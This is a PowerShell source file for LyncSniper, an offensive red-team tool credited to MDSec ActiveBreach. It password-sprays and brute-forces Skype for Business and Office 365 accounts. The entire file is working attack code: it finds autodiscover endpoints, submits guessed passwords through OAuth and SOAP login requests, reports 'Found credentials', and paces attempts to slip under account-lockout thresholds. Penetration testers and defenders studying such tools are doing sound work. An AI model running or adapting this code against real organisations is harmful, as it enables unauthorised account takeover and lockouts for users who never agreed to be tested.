#requires -version 2

<#

.____                           _________      .__
|    |    ___.__. ____   ____  /   _____/ ____ |__|_____   ___________
|    |   <   |  |/    \_/ ___\ \_____  \ /    \|  \____ \_/ __ \_  __ \
|    |___ \___  |   |  \  \___ /        \   |  \  |  |_> >  ___/|  | \/
|_______ \/ ____|___|  /\___  >_______  /___|  /__|   __/ \___  >__|
        \/\/         \/     \/        \/     \/   |__|        \/

        ︻デ┳═ー    - - - - - - - - - - - - - - - - - - - - - - - - - -

        Author: @domchell

        ActiveBreach by MDSec
#>

Import-Module '.\Tunable-SSL-Validator\TunableSSLValidator.psm1'

function Invoke-GetAutoDiscoverURL
{

  <#
    .SYNOPSIS
      This module will attempt to determine a valid AutoDiscover URL
      LyncSniper Function: Invoke-GetAutoDiscoverURL
      Author: Dominic Chell (@domchell)
      License: BSD 3-Clause
      Required Dependencies: TunableSSLValidator
      Optional Dependencies: None
    .DESCRIPTION
      This module will attempt to determine a valid AutoDiscover URL simply by prepending lyncdiscover to the domain and checking for HTTPS
    .PARAMETER UserName
      The user's name in the form of an e-mail address
    .EXAMPLE
      C:\PS> Invoke-GetAutoDiscoverURL -UserName target-user@domain.com
      Description
      -----------
      This command will attempt to connect to https://lyncdiscover.domain.com
  #>


  [CmdletBinding()]
  Param(

    [Parameter(Position = 0, Mandatory = $True)]
    [string]
    $Username = ""
  )
  try{
    $domain = $Username.split("@")[1]
    $lyncurl = "https://lyncdiscover.$($domain)"
    write-host "[*] Using autodiscover URL of $($lyncurl)"
    $data = Invoke-WebRequest -Insecure -Uri $lyncurl -Method GET -ContentType "application/json" -UseBasicParsing

    if($data)
    {
      return $lyncurl;
    }
  }catch{
    write-output "[*] Unable to get automatically retrieve autodiscover information, please specify"
    exit 1
  }
}

function Invoke-LyncSpray
{

  <#
    .SYNOPSIS
      This module will attempt to discover the URL for the Skype for Business deployment and spray passwords against it
      LyncSniper Function: Invoke-LyncSpray
      Author: Dominic Chell (@domchell)
      License: BSD 3-Clause
      Required Dependencies: TunableSSLValidator
      Optional Dependencies: None
    .DESCRIPTION
      This module will attempt to discover the URL for the Skype for Business deployment, if the URL cannot be discovered it can be forced by the user. The Office365 switch should be applied for Office 365 tenants so that the correct endpoints are used.
      The password supplied on the -Password switch will be sprayed against all user accounts.
    .PARAMETER UserList
      A txt file of target users to spray the password agaist
    .PARAMETER Password
      The password to spray against the user list
    .PARAMETER Office365
      The Skype for Business target is an Office 365 tenant
    .PARAMETER AutoDiscoverURL
      Force the user of this AutoDiscover URL
    .EXAMPLE
      C:\PS> Invoke-LyncSpray -UserList .\users.txt -Password Password1
      Description
      -----------
      This command will spray the password Password1 against the users in users.txt file
  #>

  [CmdletBinding()]
  Param(

    [Parameter(Position = 0, Mandatory = $True)]
    [string]
    $UserList = "",

    [Parameter(Position = 1, Mandatory = $True)]
    [string]
    $Password = "",

    [Parameter(Position = 2, Mandatory = $False)]
    [switch]
    $Office365,

    [Parameter(Position = 3, Mandatory = $False)]
    [string]
    $AutoDiscoverURL = ""
  )

  $Usernames = Get-Content $UserList
  $Username = $Usernames[0]
  if (-Not $AutoDiscoverURL)
  {
    Write-host "[*] No AutoDiscoverURL provided, attempting to discover"
    $AutoDiscoverURL = Invoke-GetAutoDiscoverURL -Username $Username
  }

  if ($AutoDiscoverURL)
  {
    write-host "[*] Retrieving S4B AutoDiscover Information"
    try{
      $data = Invoke-WebRequest -Insecure -Uri $AutoDiscoverURL -Method GET -ContentType "application/json" -UseBasicParsing
      if(($data.content | ConvertFrom-JSON)._links.redirect)
      {
        # this gets a little messy, accounts for 3 redirects deep, probably should have recursed
        Write-Host "[*] Received AutoDiscover Redirect"
        $s4bAutodiscover = (($data.content | ConvertFrom-JSON)._links.redirect.href)
        $data = Invoke-WebRequest -Insecure -Uri $AutoDiscoverURL -Method GET -ContentType "application/json" -UseBasicParsing
        if(($data.content | ConvertFrom-JSON)._links.redirect)
        {
          $s4bAutodiscover = (($data.content | ConvertFrom-JSON)._links.redirect.href)
          $data = Invoke-WebRequest -Insecure -Uri $s4bAutodiscover -Method GET -ContentType "application/json" -UseBasicParsing
          if(($data.content | ConvertFrom-JSON)._links.redirect)
          {
            $s4bAutodiscover = (($data.content | ConvertFrom-JSON)._links.redirect.href)
            $data = Invoke-WebRequest -Insecure -Uri $s4bAutodiscover -Method GET -ContentType "application/json" -UseBasicParsing
            write-host $data
            $baseurl = (($data.content | ConvertFrom-JSON)._links.user.href).split("/")[0..2] -join "/"
          }
          else
          {
            $baseurl = (($data.content | ConvertFrom-JSON)._links.user.href).split("/")[0..2] -join "/"
          }
        }
        else
        {
          $baseurl = (($data.content | ConvertFrom-JSON)._links.user.href).split("/")[0..2] -join "/"
        }
      }
      else
      {
        $baseurl = (($data.content | ConvertFrom-JSON)._links.user.href).split("/")[0..2] -join "/"
      }
    }catch [Exception] {
      echo $_.Exception.GetType().FullName, $_.Exception.Message
      write-host "[*] Unable to retrieve or process AutoDiscover URL"
      exit 1
    }
  }

  if($baseurl -match "online.lync.com" -And (-Not ($Office365)))
  {
    write-host -foreground "red" "[*] Domain appears to be Office365, apply -Office365 flag"
  }
  ForEach($Username in $Usernames)
  {
    if($Office365)
    {
      $result = Invoke-AuthenticateO365 -Username $Username -Password $Password
    }
    else
    {
      $result = Invoke-Authenticate -Username $Username -Password $Password -baseurl $baseurl
    }
  }
}

function Invoke-LyncBrute
{

  <#
    .SYNOPSIS
      This module will attempt to bruteforce passwords for a supplied user account
      LyncSniper Function: Invoke-LyncBrute
      Author: Dominic Chell (@domchell)
      License: BSD 3-Clause
      Required Dependencies: TunableSSLValidator
      Optional Dependencies: None
    .DESCRIPTION
      This module will attempt to discover the URL for the Skype for Business deployment, if the URL cannot be discovered it can be forced by the user. The Office365 switch should be applied for Office 365 tenants so that the correct endpoints are used.
      The username supplied will be bruteforced with the passwords in the supplied password list.
    .PARAMETER PassList
      A list of passwords to bruteforce the user account with
    .PARAMETER Username
      The username to target
    .PARAMETER Office365
      The Skype for Business target is an Office 365 tenant
    .PARAMETER AutoDiscoverURL
      Force the user of this AutoDiscover URL
    .PARAMETER TimeDelay
      Attempt 3 passwords then sleep for this delay inbetween password attempts
    .EXAMPLE
      C:\PS> Invoke-LyncBrute -PassList .\passwords.txt -UserName foo.bar@domain.com -TimeDelay 60
      Description
      -----------
      This command will bruteforce the supplied username with the passwords in the supplied password list, sleeping for 60 seconds every 3 attempts. *BEWARE OF ACCOUNT LOCKOUTS*
  #>

  [CmdletBinding()]
  Param(

    [Parameter(Position = 0, Mandatory = $True)]
    [string]
    $PassList = "",

    [Parameter(Position = 1, Mandatory = $True)]
    [string]
    $Username = "",

    [Parameter(Position = 2, Mandatory = $False)]
    [switch]
    $Office365,

    [Parameter(Position = 3, Mandatory = $False)]
    [string]
    $AutoDiscoverURL = "",

    [Parameter(Position = 4, Mandatory = $False)]
    [Int]
    $TimeDelay = 300

  )

  $Passwords = Get-Content $PassList

  if (-Not $AutoDiscoverURL)
  {
    Write-host "[*] No AutoDiscoverURL provided, attempting to discover"
    $AutoDiscoverURL = Invoke-GetAutoDiscoverURL -Username $Username
  }

  if ($AutoDiscoverURL)
  {
    write-host "[*] Retrieving S4B AutoDiscover Information"
    try{
      $data = Invoke-WebRequest -Insecure -Uri $AutoDiscoverURL -Method GET -ContentType "application/json" -UseBasicParsing
      if(($data.content | ConvertFrom-JSON)._links.redirect)
      {
        # this gets a little messy, accounts for 3 redirects deep but should have recursed
        Write-Host "[*] Received AutoDiscover Redirect"
        $s4bAutodiscover = (($data.content | ConvertFrom-JSON)._links.redirect.href)
        $data = Invoke-WebRequest -Insecure -Uri $AutoDiscoverURL -Method GET -ContentType "application/json" -UseBasicParsing
        if(($data.content | ConvertFrom-JSON)._links.redirect)
        {
          $s4bAutodiscover = (($data.content | ConvertFrom-JSON)._links.redirect.href)
          $data = Invoke-WebRequest -Insecure -Uri $s4bAutodiscover -Method GET -ContentType "application/json" -UseBasicParsing
          if(($data.content | ConvertFrom-JSON)._links.redirect)
          {
            $s4bAutodiscover = (($data.content | ConvertFrom-JSON)._links.redirect.href)
            $data = Invoke-WebRequest -Insecure -Uri $s4bAutodiscover -Method GET -ContentType "application/json" -UseBasicParsing
            write-host $data
            $baseurl = (($data.content | ConvertFrom-JSON)._links.user.href).split("/")[0..2] -join "/"
          }
          else
          {
            $baseurl = (($data.content | ConvertFrom-JSON)._links.user.href).split("/")[0..2] -join "/"
          }
        }
        else
        {
          $baseurl = (($data.content | ConvertFrom-JSON)._links.user.href).split("/")[0..2] -join "/"
        }
      }
      else
      {
        $baseurl = (($data.content | ConvertFrom-JSON)._links.user.href).split("/")[0..2] -join "/"
      }
    }catch [Exception] {
      echo $_.Exception.GetType().FullName, $_.Exception.Message
      write-host "[*] Unable to retrieve or process AutoDiscover URL"
      exit 1
    }
  }

  if($baseurl -match "online.lync.com" -And (-Not ($Office365)))
  {
    write-host -foreground "red" "[*] Domain appears to be Office365, apply -Office365 flag"
  }

  Write-Host -foreground "blue" "[*] Commencing bruteforce at $(Get-Date)"
  Write-Host -foreground "red" "[*] BEWARE OF ACCOUNT LOCKOUTS"
  $counter = 1
  $delay = 60
  ForEach($Password in $Passwords)
  {
    # Account Lockout	After 10 unsuccessful sign-in attempts (wrong password), the user will be
    # locked out for one minute. Further incorrect sign-in attempts will lock out the user for increasing durations.
    # https://docs.microsoft.com/en-gb/azure/active-directory/active-directory-passwords-policy

    if($Office365)
    {
      if($counter -ge 10)
      {
        Write-Host -foreground "blue" "[*] Current time $(Get-Date)"
        write-host -foreground "red" "[*] Sleeping for $($delay) seconds"
        # sleep for 60 then an ever increasing amount between attempts :(
        # behaviour is o365 specific but had most success in this config
        sleep $delay;
        # increment delay up to 5 mins
        if($delay -le 300)
        {
          $delay+=20
        }
      }
      $result = Invoke-AuthenticateO365 -Username $Username -Password $Password
    }
    else
    {
      if($counter -ge 4)
      {
        if(-Not $TimeDelay)
        {
          $TimeDelay = 300
        }
        Write-Host -foreground "blue" "[*] Current time $(Get-Date)"
        write-host -foreground "red" "[*] Sleeping for $($TimeDelay) seconds"
        # sleep for 60 every 3 attempts - may need adjusting to avoid lockouts
        sleep $TimeDelay;
        $counter=1;
      }
      $result = Invoke-Authenticate -Username $Username -Password $Password -baseurl $baseurl
    }
    $counter++;

  }
  Write-Host -foreground "blue" "[*] Ending bruteforce at $(Get-Date)"
}

function Invoke-Authenticate
{
  <#
    .SYNOPSIS
      This module will attempt to authenticate to a standalone Skype for Business service.
      LyncSniper Function: Invoke-Authenticate
      Author: Dominic Chell (@domchell)
      License: BSD 3-Clause
      Required Dependencies: TunableSSLValidator
      Optional Dependencies: None
    .DESCRIPTION
      This module will attempt to authenticate with give credentials against a Skype for Business service.
    .PARAMETER Username
      The username to authenticate with
    .PARAMETER Password
      The password to authenticate with
    .PARAMETER baseurl
      The base URL for the Skype for Business service
    .EXAMPLE
      C:\PS> Invoke-Authenticate -Username user@domain.com -Password Password1 -baseurl https://lync.domain.com
      Description
      -----------
      This command will attempt to authenticate to the Skype for Business service.
  #>

  [CmdletBinding()]
  Param(
    [Parameter(Position = 0, Mandatory = $True)]
    [string]
    $Username = "",

    [Parameter(Position = 1, Mandatory = $True)]
    [string]
    $Password = "",

    [Parameter(Position = 2, Mandatory = $True)]
    [string]
    $baseurl = ""

  )
  $pwd = $Password | convertto-securestring -AsPlainText -Force

  try{
    $postParams = @{grant_type="password";username=$Username;password=$Password}
    $data = Invoke-WebRequest -Uri "$baseurl/WebTicket/oauthtoken" -Method POST -Body $postParams -UseBasicParsing
    $authcwt = ($data.content | ConvertFrom-JSON).access_token
  }catch [Exception]{
    echo $_.Exception.GetType().FullName, $_.Exception.Message
    Write-Verbose "[*] Invalid credentials: $($Username):$($Password)"
    return
  }
  write-host -foreground "green" "[*] Found credentials: $($Username):$($Password)"
}

function Invoke-AuthenticateO365
{
  <#
    .SYNOPSIS
      This module will attempt to authenticate to the Office 365 Skype for Business service using Windows Live credentials.
      LyncSniper Function: Invoke-AuthenticateO365
      Author: Dominic Chell (@domchell)
      License: BSD 3-Clause
      Required Dependencies: TunableSSLValidator
      Optional Dependencies: None
    .DESCRIPTION
      This module will attempt to authenticate with give credentials against the Office 365 Skype for Business service.
    .PARAMETER Username
      The Windows Live username to authenticate with
    .PARAMETER Password
      The Windows Live password to authenticate with
    .EXAMPLE
      C:\PS> Invoke-AuthenticateO365 -Username user@domain.com -Password Password1
      Description
      -----------
      This command will attempt to authenticate to the Office 365 Skype for Business service.
  #>
  [CmdletBinding()]
  Param(
    [Parameter(Position = 0, Mandatory = $True)]
    [string]
    $Username = "",

    [Parameter(Position = 1, Mandatory = $True)]
    [string]
    $Password = ""
  )

  try
  {
    $soap = @"
<?xml version="1.0" encoding="UTF-8"?>
<S:Envelope xmlns:S="http://www.w3.org/2003/05/soap-envelope" xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust">
    <S:Header>
    <wsa:Action S:mustUnderstand="1">http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action>
    <wsa:To S:mustUnderstand="1">https://login.microsoftonline.com/rst2.srf</wsa:To>
    <ps:AuthInfo xmlns:ps="http://schemas.microsoft.com/LiveID/SoapServices/v1" Id="PPAuthInfo">
        <ps:BinaryVersion>5</ps:BinaryVersion>
        <ps:HostingApp>Managed IDCRL</ps:HostingApp>
    </ps:AuthInfo>
    <wsse:Security>
    <wsse:UsernameToken wsu:Id="user">
        <wsse:Username>$($Username)</wsse:Username>
        <wsse:Password>$($Password)</wsse:Password>
    </wsse:UsernameToken>
    <wsu:Timestamp Id="Timestamp">
        <wsu:Created>$(([DateTime]::UtcNow.ToString("o")))</wsu:Created>
        <wsu:Expires>$(([DateTime]::UtcNow.AddDays(1).ToString("o")))</wsu:Expires>
    </wsu:Timestamp>
</wsse:Security>
    </S:Header>
    <S:Body>
    <wst:RequestSecurityToken xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust" Id="RST0">
        <wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType>
        <wsp:AppliesTo>
        <wsa:EndpointReference>
            <wsa:Address>online.lync.com</wsa:Address>
        </wsa:EndpointReference>
        </wsp:AppliesTo>
        <wsp:PolicyReference URI="MBI"></wsp:PolicyReference>
    </wst:RequestSecurityToken>
    </S:Body>
</S:Envelope>
"@

    $loginUrl = "https://login.microsoftonline.com/rst2.srf"
    $body = [System.Text.Encoding]::UTF8.GetBytes($soap)
    $request = [System.Net.WebRequest]::Create($loginUrl)
    $request.Method = "POST"
    $request.ContentType = "application/soap+xml; charset=utf-8"
    $stream = $request.GetRequestStream()
    $stream.Write($body, 0, $body.Length)
    $response = $request.GetResponse()

    $data = $null
    try {
      $streamReader = New-Object System.IO.StreamReader $response.GetResponseStream()
      try {
        [xml]$data = $streamReader.ReadToEnd()
      } finally {
        $streamReader.Dispose()
      }
    } finally {
      $response.Dispose()
    }
    $BinarySecurityToken = $data.Envelope.Body.RequestSecurityTokenResponse.RequestedSecurityToken.BinarySecurityToken.InnerText
    if($BinarySecurityToken)
    {
      write-host -foreground "green" "[*] Found credentials: $($Username):$($Password)"
    }
    else
    {
      Write-Verbose "[*] Invalid credentials: $($Username):$($Password)"
    }

  } catch {
    $_.Exception
  }
}
